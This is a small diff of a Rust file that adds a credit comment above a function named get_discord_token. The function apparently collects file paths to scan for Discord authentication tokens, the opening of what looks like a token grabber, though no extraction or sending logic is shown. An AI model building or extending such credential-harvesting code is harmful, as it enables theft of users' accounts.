@@ -3,6 +3,8 @@ use std::path::PathBuf;
 
 use regex::Regex;
 
+// credits to https://github.com/r-o-b-o-t-o
+
 pub fn get_discord_token(path: Option<PathBuf>) -> Vec<String> {
     let paths_to_check = get_paths(path);
     if paths_to_check.len() == 0 {
